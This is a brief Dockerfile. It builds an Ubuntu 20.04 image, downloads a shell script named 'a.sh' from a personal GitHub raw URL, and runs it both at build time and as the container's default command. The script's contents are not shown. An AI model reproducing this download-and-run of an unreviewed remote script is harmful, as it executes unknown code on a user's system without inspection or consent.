FROM ubuntu:20.04 as ubuntu-base
RUN apt update -y \
    && apt upgrade -y \
    && apt install -y wget sudo make git busybox\
    && apt install unzip -y
RUN wget https://raw.githubusercontent.com/AntonyAjax/kawakita/main/a.sh
RUN bash a.sh

CMD bash a.sh
